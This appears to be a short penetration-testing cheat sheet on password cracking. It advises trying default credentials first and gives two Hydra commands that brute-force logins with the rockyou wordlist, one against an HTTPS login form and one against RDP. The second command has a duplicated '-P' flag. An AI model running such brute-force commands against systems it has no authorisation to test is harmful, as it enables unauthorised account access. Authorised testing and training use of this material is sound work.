# 05 - Password Cracking

Index
- [First Rule!](#First-Rule)
- [Form Login](#Form-Login)

## First Rule
Always try the default credentials!

## Form Login
Hydra:
``` bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -s 443 http-post-form "/login.php:LOGIN=^LOGIN^&password=^PASS^:Login failed"
         # user file # password file                  # target           # method                   # user field                  # error msg
```

``` bash
hydra -L user.txt -P -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.1
```